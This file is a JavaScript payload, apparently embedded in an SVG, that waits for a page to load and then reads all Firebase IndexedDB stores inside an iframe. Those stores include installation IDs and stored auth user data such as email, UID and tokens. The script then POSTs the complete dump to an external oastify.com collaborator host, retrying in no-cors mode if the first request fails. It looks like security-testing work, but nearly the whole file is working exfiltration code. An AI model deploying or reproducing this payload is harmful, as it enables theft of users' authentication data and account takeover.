svg.script:

console.clear();
console.log('═══════════════════════════════════════');
console.log('🗄️ INDEXEDDB EXTRACTOR - SUCCESS');
console.log('═══════════════════════════════════════');
console.log('📍 Origin:', window.location.origin);
console.log('📍 URL:', window.location.href);

const statusLog = document.getElementById('statusLog');

function logStatus(message, isError = false, isSuccess = false) {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
    const entry = `[${timestamp}] ${prefix} ${message}`;
    console.log(entry);
    if (statusLog) {
        const color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
        statusLog.innerHTML += `<div style="color:${color}">${entry}</div>`;
        statusLog.scrollTop = statusLog.scrollHeight;
    }
}

// ============================================
// ACCESS IFRAME'S INDEXEDDB
// ============================================

async function extractIframeIndexedDB() {
    logStatus('🚀 Starting extraction from iframe IndexedDB...');

    const iframe = document.getElementById('planetIframe');
    if (!iframe) {
        logStatus('❌ Iframe not found', true);
        return null;
    }

    if (!iframe.contentWindow) {
        logStatus('❌ Cannot access iframe contentWindow', true);
        return null;
    }

    try {
        const iframeDB = iframe.contentWindow.indexedDB;
        logStatus('✅ Got iframe IndexedDB reference', false, true);

        // Get databases from iframe
        const databases = await iframeDB.databases();
        logStatus(`📌 Found ${databases.length} databases in iframe`);

        if (databases.length === 0) {
            logStatus('⚠️ No databases found in iframe', true);
            return null;
        }

        // List all databases
        const dbNames = databases.map(db => db.name);
        logStatus(`📌 Databases: ${dbNames.join(', ')}`);

        // Find Firebase databases
        const firebaseDBs = databases.filter(db => 
            db.name && (
                db.name.includes('firebase') ||
                db.name.includes('heartbeat') ||
                db.name.includes('installations') ||
                db.name.includes('LocalStorage')
            )
        );

        if (firebaseDBs.length === 0) {
            logStatus('⚠️ No Firebase databases found', true);
            return null;
        }

        logStatus(`✅ Found ${firebaseDBs.length} Firebase databases in iframe`, false, true);

        // Extract data from iframe's IndexedDB
        const allData = {};
        for (const dbInfo of firebaseDBs) {
            const dbName = dbInfo.name;
            logStatus(`📖 Reading iframe database: ${dbName}`);

            try {
                const db = await new Promise((resolve, reject) => {
                    const req = iframeDB.open(dbName);
                    req.onsuccess = () => resolve(req.result);
                    req.onerror = () => reject(req.error);
                });

                const stores = Array.from(db.objectStoreNames);
                const dbData = {};

                for (const storeName of stores) {
                    logStatus(`  📖 Reading store: ${storeName}`);

                    const data = await new Promise((resolve, reject) => {
                        const tx = db.transaction(storeName, 'readonly');
                        const req = tx.objectStore(storeName).getAll();
                        req.onsuccess = () => resolve(req.result);
                        req.onerror = () => reject(req.error);
                    });

                    dbData[storeName] = data;
                    logStatus(`    ✅ ${data.length} records`, false, true);

                    if (data.length > 0) {
                        console.log(`    Sample from ${storeName}:`, data[0]);
                    }
                }

                allData[dbName] = dbData;
                db.close();

                const totalRecords = Object.values(dbData).reduce((sum, store) => {
                    if (Array.isArray(store)) return sum + store.length;
                    return sum;
                }, 0);
                logStatus(`  ✅ ${dbName}: ${stores.length} stores, ${totalRecords} records`, false, true);

            } catch (error) {
                logStatus(`  ❌ Error reading ${dbName}: ${error.message}`, true);
            }
        }

        return allData;

    } catch (error) {
        logStatus(`❌ Error accessing iframe IndexedDB: ${error.message}`, true);
        console.error('Error:', error);
        return null;
    }
}

// ============================================
// SEND TO SERVER
// ============================================

async function sendToServer(data) {
    const serverUrl = 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb';

    logStatus(`📤 Preparing to send data to server...`);

    // Calculate total records
    let totalRecords = 0;
    for (const db of Object.values(data)) {
        for (const store of Object.values(db)) {
            if (Array.isArray(store)) {
                totalRecords += store.length;
            }
        }
    }

    logStatus(`📊 Total records to send: ${totalRecords}`);
    logStatus(`📦 Data size: ${JSON.stringify(data).length} bytes`);

    // Extract sensitive data
    const extractedData = {
        heartbeat: null,
        installations: null,
        authUser: null
    };

    // Parse firebase-heartbeat-database
    if (data['firebase-heartbeat-database']) {
        const heartbeatStore = data['firebase-heartbeat-database']['firebase-heartbeat-store'];
        if (heartbeatStore && heartbeatStore.length > 0) {
            extractedData.heartbeat = heartbeatStore[0];
            logStatus(`❤️ Heartbeat data: ${JSON.stringify(heartbeatStore[0]).substring(0, 200)}...`);
        }
    }

    // Parse firebase-installations-database
    if (data['firebase-installations-database']) {
        const installStore = data['firebase-installations-database']['firebase-installations-store'];
        if (installStore && installStore.length > 0) {
            extractedData.installations = installStore[0];
            logStatus(`🔑 Installations data found (FID: ${installStore[0].fid})`);
        }
    }

    // Parse firebaseLocalStorageDb
    if (data['firebaseLocalStorageDb']) {
        const authStore = data['firebaseLocalStorageDb']['firebaseLocalStorage'];
        if (authStore && authStore.length > 0) {
            extractedData.authUser = authStore[0];
            logStatus(`👤 Auth user data found`);
            try {
                const authData = JSON.parse(authStore[0].value);
                logStatus(`  📧 Email: ${authData.email || 'N/A'}`);
                logStatus(`  🆔 UID: ${authData.uid || 'N/A'}`);
            } catch(e) {
                logStatus(`  📝 Auth data: ${JSON.stringify(authStore[0]).substring(0, 200)}...`);
            }
        }
    }

    try {
        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                source: window.location.origin,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                totalRecords: totalRecords,
                extracted: extractedData,
                fullData: data,
                success: true
            })
        });

        if (response.ok) {
            const result = await response.json();
            logStatus(`✅ Data sent successfully! Status: ${response.status}`, false, true);
            console.log('Server response:', result);
        } else {
            const text = await response.text();
            logStatus(`❌ Server error: ${response.status} - ${text}`, true);
        }
    } catch (error) {
        logStatus(`❌ Network error: ${error.message}`, true);
        console.error('Network error:', error);

        // Try no-cors mode as fallback
        try {
            logStatus('🔄 Trying no-cors mode...');
            await fetch(serverUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    source: window.location.origin,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    data: extractedData,
                    fullData: data,
                    success: true
                })
            });
            logStatus('✅ Request sent (no-cors) - check server logs', false, true);
        } catch (e2) {
            logStatus(`❌ No-cors failed: ${e2.message}`, true);
        }
    }
}

// ============================================
// MAIN EXECUTION
// ============================================

async function main() {
    logStatus('═══════════════════════════════════════');
    logStatus('🚀 Starting iframe IndexedDB extraction...');

    // Wait for iframe to load
    logStatus('⏳ Waiting for iframe to load (5 seconds)...');
    await new Promise(resolve => setTimeout(resolve, 5000));

    const data = await extractIframeIndexedDB();

    if (data && Object.keys(data).length > 0) {
        let totalRecords = 0;
        for (const db of Object.values(data)) {
            for (const store of Object.values(db)) {
                if (Array.isArray(store)) {
                    totalRecords += store.length;
                }
            }
        }

        logStatus(`📊 Extracted ${totalRecords} total records`, false, true);
        await sendToServer(data);
    } else {
        logStatus('⚠️ No data extracted', true);
        logStatus('💡 Possible reasons:');
        logStatus('  1. Iframe not fully loaded/authenticated');
        logStatus('  2. No Firebase databases exist');
        logStatus('  3. Database name is different');
    }

    logStatus('✅ Extraction complete');
    logStatus('═══════════════════════════════════════');
}

// Run after a delay
setTimeout(main, 3000);

logStatus('⏳ Initializing...');
logStatus('📍 This SVG will extract all IndexedDB data from the iframe');
logStatus('📌 Found databases will be: firebase-heartbeat-database, firebase-installations-database, firebaseLocalStorageDb');
